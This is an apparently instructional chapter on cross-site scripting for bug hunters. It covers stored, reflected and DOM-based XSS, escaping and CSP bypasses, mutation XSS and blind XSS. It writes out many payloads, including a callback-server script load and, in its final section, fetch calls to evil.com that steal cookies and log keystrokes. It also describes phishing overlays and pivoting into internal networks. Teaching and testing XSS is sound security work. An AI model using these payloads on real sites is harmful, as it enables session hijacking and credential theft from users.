Chapter 7 – Cross-Site Scripting (XSS): Hijacking the Browser
XSS is when you inject JavaScript into a victim’s browser through a vulnerable site. It’s the most common web vulnerability and a direct path to account takeover. There are three flavors—hunt them all.

1. Stored XSS – The Gift That Keeps on Giving
Mechanism: Malicious payload lands in the database (comment, profile, product review) and gets served to every visitor.

Hunter’s gold: A single stored XSS can compromise every user who views the poisoned page—admin, support, other customers.

Where to look:

User profiles (name, bio, photo caption)

Forums, comment sections, private messages

E‑commerce product reviews, wishlists

Any persistent user input that is reflected unescaped.

Test: Submit <script>alert(document.domain)</script> or a simple image <img src=x onerror=alert(1)>. If it fires on reload, you’ve won.

2. Reflected XSS – The One‑Click Trap
Mechanism: Payload comes from the HTTP request (URL parameter, POST body) and is immediately reflected in the response.

Delivery: Send the malicious link to the victim via email, chat, or an iframe on another site. When they click, their browser executes your script in the target’s origin.

Common sinks:

Search boxes that echo the query

Error messages that include the bad input

Redirect parameters (?next=javascript:alert(1))

Login forms that pre‑fill the username from the URL.

Fast test: Insert "><h1>test</h1> and look for DOM breakage. Then escalate to an event handler payload: "><svg onload=alert(1)>.

3. DOM‑based XSS – Pure Client‑Side Mayhem
Mechanism: JavaScript on the page unsafely reads from a source (URL fragment, document.referrer, window.name, postMessage) and writes to a sink (innerHTML, eval(), document.write()).

Crucial: The server never sees the payload. You can’t detect it in logs, making it a blind spot for many defenses.

Sources to trace: location.hash, location.search, document.URL, window.name, localStorage, sessionStorage.

Sinks to grep in JS files:

innerHTML, outerHTML, document.write(), eval(), setTimeout()/setInterval() (string arg), Function() constructor, location assignments.

React’s dangerouslySetInnerHTML, Angular’s bypassSecurityTrustHtml.

Test manually: Append #<img src=x onerror=alert(1)> to the URL. If the page uses the hash to render something, it may fire.

4. Bypassing Defenses – Because Defenses Are Never Complete
HTML escaping bypass: Sometimes the server escapes < and > but not attribute contexts. Try " onmouseover="alert(1) inside an input tag. Use ' or backticks. Check for double‑encoding.

CSP bypass: Even with strict script-src 'self', you might find:

JSONP endpoints on whitelisted domains that allow callback hijacking.

Angular sandbox escapes (older versions).

Script gadgets (libraries like jQuery that turn harmless HTML into code execution via $() constructor or .html()).

script-src with unsafe-eval → use eval() directly.

If the policy includes https://cdnjs.cloudflare.com, load an old version of Angular or Prototype and use known sandbox bypasses.

mXSS (Mutation XSS): Exploit browser parsing quirks. A harmless string like <table><svg><script> gets mutated by the browser’s DOM builder into an executable script. Test with <svg><p><style><img src=x onerror=alert(1)> inside innerHTML.

5. Blind XSS – The Hunter’s Secret Weapon
What if the input is only viewed by an internal admin panel or support tool? You can’t see the alert, but you can still capture the victim’s session.

Technique: Use an XSS Hunter (e.g., xsshunter.com) or your own callback server. Payload: "><script src=https://your-subdomain.xss.ht></script>. When the script loads, you’ll see the page’s HTML, cookies, and the victim’s IP.

Prime targets: Contact forms, user‑agent headers, ticket systems, logging dashboards. Many are vulnerable because developers forget to escape inputs that only admins see.

6. Practical Exploitation – What to Do After Alert(1)
Session hijacking: fetch('https://evil.com/?c='+document.cookie). If cookies lack HttpOnly, you steal them instantly.

Keylogging: document.onkeydown = e => fetch('https://evil.com/?k='+e.key) captures passwords and credit cards.

Phishing overlay: Inject a fake login form that exfiltrates credentials to your server.

Access internal services: If victim is an admin, use XSS to read internal pages via fetch('/admin') and exfiltrate CSRF tokens to perform privileged actions (port scanning, internal network pivoting via websocket).
